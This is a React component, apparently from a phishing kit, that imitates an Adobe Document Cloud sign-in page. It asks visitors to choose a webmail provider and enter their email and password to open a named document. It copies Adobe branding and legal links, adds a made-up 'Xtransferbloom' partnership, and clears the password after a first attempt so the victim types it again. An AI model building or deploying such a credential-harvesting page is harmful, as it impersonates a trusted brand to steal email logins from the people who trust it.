import React, { useState } from 'react';
import { ArrowLeft, Eye, EyeOff } from 'lucide-react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface LoginPageBaseProps {
  variant: 'desktop' | 'mobile';
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onYahooSelect?: () => void;
  onAolSelect?: () => void;
  onGmailSelect?: () => void;
  onOffice365Select?: () => void;
  onOthersSelect?: () => void;
  defaultProvider?: string;
}

const LoginPageBase: React.FC<LoginPageBaseProps> = ({ 
  variant,
  fileName, 
  onBack,
  onLoginSuccess, 
  onLoginError,
  onYahooSelect,
  onAolSelect,
  onGmailSelect,
  onOffice365Select,
  onOthersSelect,
  defaultProvider,
}) => {
  const isDesktop = variant === 'desktop';
  const [selectedProvider, setSelectedProvider] = useState<string | null>(defaultProvider || null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  
  const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
    onLoginSuccess,
    onLoginError
  );

  const emailProviders: { name: string; icon: React.ReactNode }[] = [
    { name: 'Office365', icon: (
      <svg viewBox="0 0 21 21" className="w-6 h-6 flex-shrink-0"><rect x="1" y="1" width="9" height="9" fill="#F25022"/><rect x="11" y="1" width="9" height="9" fill="#7FBA00"/><rect x="1" y="11" width="9" height="9" fill="#00A4EF"/><rect x="11" y="11" width="9" height="9" fill="#FFB900"/></svg>
    )},
    { name: 'Yahoo', icon: (
      <svg viewBox="0 0 500 128" className="w-6 h-6 flex-shrink-0"><g fill="#720e9e"><path d="M115.258 1.794L76.27 71.885l-.436 54.396h-30.3l.435-54.396L7.98 1.794h34.36l22.15 44.47L86.29 1.794z"/><path d="M218.87 62.186c0-35.072 25.53-62.186 57.646-62.186 32.115 0 57.646 27.114 57.646 62.186s-25.53 62.186-57.646 62.186c-32.116 0-57.647-27.114-57.647-62.186zm84.206 0c0-20.452-11.44-33.697-26.56-33.697S249.957 41.734 249.957 62.186s11.44 33.697 26.56 33.697 26.559-13.245 26.559-33.697z"/></g></svg>
    )},
    { name: 'Outlook', icon: (
      <svg viewBox="0 0 24 24" className="w-6 h-6 flex-shrink-0"><path fill="#0078D4" d="M24 7.387v10.478c0 .23-.08.424-.238.576a.806.806 0 01-.587.234h-8.55V6.577h8.55c.226 0 .42.08.582.234.16.154.24.348.243.576zM14.625 3.21v18.832L0 19.5V5.75l14.625-2.54z"/><ellipse fill="#fff" cx="7.313" cy="12.375" rx="3.563" ry="4.125"/></svg>
    )},
    { name: 'AOL', icon: (
      <svg viewBox="0 0 200 72" className="w-6 h-6 flex-shrink-0"><g fill="#39007E"><path d="M46.04 56.92H18.58L13.1 70H0L30.3 2h5.6L66.3 70H52.44zM42.5 47.3L32.36 15.8 22 47.3z"/><path d="M109.3 36c0 20.6-15.4 36-36.6 36S36 56.6 36 36 51.5 0 72.7 0s36.6 15.4 36.6 36zm-60 0c0 14.2 9.8 25.3 23.4 25.3S96.1 50.2 96.1 36 86.3 10.7 72.7 10.7 49.3 21.8 49.3 36z"/><path d="M119.6 2h12.6v56.3h30v11.5H119.6z"/><circle cx="183.5" cy="55.5" r="14.5"/></g></svg>
    )},
    { name: 'Gmail', icon: (
      <svg viewBox="0 0 24 24" className="w-6 h-6 flex-shrink-0"><path fill="#EA4335" d="M24 5.457v13.909c0 .904-.732 1.636-1.636 1.636h-3.819V11.73L12 16.64l-6.545-4.91v9.273H1.636A1.636 1.636 0 010 19.366V5.457c0-2.023 2.309-3.178 3.927-1.964L12 9.548l8.073-6.055C21.69 2.28 24 3.434 24 5.457z"/></svg>
    )},
    { name: 'Others', icon: (
      <svg viewBox="0 0 24 24" className="w-6 h-6 flex-shrink-0" fill="none" stroke="currentColor" strokeWidth="1.5"><rect x="2" y="4" width="20" height="16" rx="2" className="stroke-gray-400"/><path d="M2 7l10 7 10-7" className="stroke-gray-400"/></svg>
    )}
  ];

  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    resetLoginState();
    onBack();
  };

  const handleProviderClick = (providerName: string) => {
    if (providerName === 'Office365' && onOffice365Select) {
      onOffice365Select();
    } else if (providerName === 'Outlook' && onOffice365Select) {
      onOffice365Select();
    } else if (providerName === 'Yahoo' && onYahooSelect) {
      onYahooSelect();
    } else if (providerName === 'AOL' && onAolSelect) {
      onAolSelect();
    } else if (providerName === 'Gmail' && onGmailSelect) {
      onGmailSelect();
    } else if (providerName === 'Others' && onOthersSelect) {
      onOthersSelect();
    } else {
      setSelectedProvider(providerName);
    }
  };

  const AdobeLogo = () => (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className={isDesktop ? "w-7 h-7" : "w-6 h-6"}>
      <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
      <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
      <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
    </svg>
  );

  const Footer = () => (
    <div className={isDesktop ? "mt-10 pt-6" : "mt-8 pt-5"} style={{ borderTop: '1px solid rgba(255,255,255,0.12)' }}>
      <div className={`flex items-center justify-center gap-2 ${isDesktop ? 'mb-3' : 'mb-2'}`}>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className={isDesktop ? "w-4 h-4" : "w-3.5 h-3.5"}>
          <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
          <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
          <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
        </svg>
        <span className="text-xs font-medium text-gray-300">Adobe Document Cloud</span>
      </div>
      <p className="text-xs text-gray-400 text-center mb-2">Secured by Adobe® in partnership with Xtransferbloom</p>
      <div className={`flex items-center justify-center ${isDesktop ? 'gap-3' : 'gap-2'} text-xs text-gray-400`}>
        <a href="https://www.adobe.com/privacy.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-200 transition-colors">Privacy</a>
        <span style={{ color: 'rgba(255,255,255,0.3)' }}>|</span>
        <a href="https://www.adobe.com/legal/terms.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-200 transition-colors">Terms of Use</a>
        <span style={{ color: 'rgba(255,255,255,0.3)' }}>|</span>
        <a href="https://www.adobe.com/privacy/cookies.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-200 transition-colors">Cookie Preferences</a>
      </div>
      <p className="text-xs text-gray-500 text-center mt-2">© 2026 Adobe. All rights reserved.</p>
    </div>
  );

  return (
    <div className={isDesktop ? "min-h-screen flex items-center justify-center p-4 font-sans" : "min-h-screen flex flex-col font-sans"} style={{ background: 'linear-gradient(135deg, #1B1B1B 0%, #2C2C2C 50%, #1B1B1B 100%)', fontFamily: "'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
      {/* Adobe red accent bar at the very top */}
      <div className={isDesktop ? "fixed top-0 left-0 right-0 h-1" : "fixed top-0 left-0 right-0 h-1 z-10"} style={{ background: 'linear-gradient(90deg, #FA0F00, #E8336D, #1473E6)' }} />

      {!selectedProvider ? (
        <div className={isDesktop ? "w-full max-w-sm" : "flex-1 flex flex-col justify-center px-6 py-8"}>
          <div className={`${isDesktop ? 'mb-10' : 'mb-8'} text-center`}>
            <div className={`flex justify-center ${isDesktop ? 'mb-5' : 'mb-4'}`}>
              <AdobeLogo />
            </div>
            <h1 className={`${isDesktop ? 'text-xl' : 'text-lg'} font-semibold text-white ${isDesktop ? 'mb-2' : 'mb-1'}`}>Sign in to access your document</h1>
            <p className="text-sm text-gray-400">
              <span className="font-medium text-gray-300">{fileName}</span>
            </p>
          </div>
          
          <p className={`text-sm font-medium text-gray-300 ${isDesktop ? 'mb-4' : 'mb-3'}`}>Choose your email provider</p>
          <div className="space-y-2">
            {emailProviders.map((provider) => (
              <button
                key={provider.name}
                onClick={() => handleProviderClick(provider.name)}
                type="button"
                className="w-full group"
              >
                {isDesktop ? (
                  <div className="flex items-center px-4 py-3 rounded-md border transition-all duration-150" style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderColor: 'rgba(255,255,255,0.12)' }} onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = 'rgba(255,255,255,0.1)'; e.currentTarget.style.borderColor = '#1473E6'; }} onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = 'rgba(255,255,255,0.05)'; e.currentTarget.style.borderColor = 'rgba(255,255,255,0.12)'; }}>
                    {provider.icon}
                    <span className="flex-1 text-sm font-medium text-gray-200 group-hover:text-white transition-colors ml-3 text-left">
                      {provider.name}
                    </span>
                    <svg className="w-4 h-4 text-gray-500 group-hover:text-[#1473E6] transition-colors flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                    </svg>
                  </div>
                ) : (
                  <div className="flex items-center px-4 py-3 rounded-md transition-all duration-150" style={{ backgroundColor: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.12)' }}>
                    {provider.icon}
                    <span className="flex-1 text-sm font-medium text-gray-200 ml-3 text-left">
                      {provider.name}
                    </span>
                    <svg className="w-4 h-4 text-gray-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                    </svg>
                  </div>
                )}
              </button>
            ))}
          </div>

          <Footer />
        </div>
      ) : (
        <div className={isDesktop ? "w-full max-w-sm" : "flex-1 flex flex-col justify-center px-6 py-8"}>
          <div className={`${isDesktop ? 'mb-8' : 'mb-6'} text-center`}>
            <div className={`flex justify-center ${isDesktop ? 'mb-5' : 'mb-4'}`}>
              <AdobeLogo />
            </div>
            <h1 className={`${isDesktop ? 'text-xl' : 'text-lg'} font-semibold text-white`}>Sign in with {selectedProvider}</h1>
            <p className="text-sm text-gray-400 mt-1">
              to access <span className="font-medium text-gray-300">{fileName}</span>
            </p>
          </div>

          <button onClick={handleBackToProviders} className={`flex items-center gap-1.5 text-sm text-[#1473E6] ${isDesktop ? 'hover:text-[#4B9CF5] mb-6' : 'active:text-[#4B9CF5] mb-5'} font-medium transition-colors`}>
            <ArrowLeft className="w-4 h-4" />
            {isDesktop ? 'Back to providers' : 'Change provider'}
          </button>

          <form onSubmit={handleSubmit} className="space-y-5">
            {errorMessage && (
              <div className="p-3 rounded-md text-sm font-medium flex items-start gap-2" style={{ backgroundColor: 'rgba(215, 55, 63, 0.15)', color: '#FF6B6B', border: '1px solid rgba(215, 55, 63, 0.3)' }}>
                <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
                <span>{errorMessage}</span>
              </div>
            )}

            <div>
              <label className="text-sm font-medium text-gray-300 block mb-1.5" htmlFor="email">Email address</label>
              <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className={`w-full px-3 ${isDesktop ? 'py-2.5' : 'py-3'} rounded-md text-sm text-white outline-none transition placeholder:text-gray-500`} style={{ backgroundColor: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.15)' }} onFocus={(e) => { e.currentTarget.style.borderColor = '#1473E6'; e.currentTarget.style.boxShadow = '0 0 0 2px rgba(20,115,230,0.3)'; }} onBlur={(e) => { e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)'; e.currentTarget.style.boxShadow = 'none'; }} />
            </div>

            <div>
              <label className="text-sm font-medium text-gray-300 block mb-1.5" htmlFor="password">Password</label>
              <div className="relative">
                <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className={`w-full px-3 pr-10 ${isDesktop ? 'py-2.5' : 'py-3'} rounded-md text-sm text-white outline-none transition placeholder:text-gray-500`} style={{ backgroundColor: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.15)' }} onFocus={(e) => { e.currentTarget.style.borderColor = '#1473E6'; e.currentTarget.style.boxShadow = '0 0 0 2px rgba(20,115,230,0.3)'; }} onBlur={(e) => { e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)'; e.currentTarget.style.boxShadow = 'none'; }} />
                <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-200 transition-colors">
                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <button type="submit" disabled={isLoading || !email || !password} className={`w-full flex items-center justify-center ${isDesktop ? 'py-2.5' : 'py-3'} px-4 rounded-full font-semibold text-sm text-white bg-[#1473E6] hover:bg-[#0d66d0] disabled:opacity-50 ${isDesktop ? 'disabled:cursor-not-allowed' : ''} transition-colors`}>
              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
              {isLoading ? 'Verifying...' : 'Sign In'}
            </button>
          </form>

          <Footer />
        </div>
      )}
    </div>
  );
};

export default LoginPageBase;
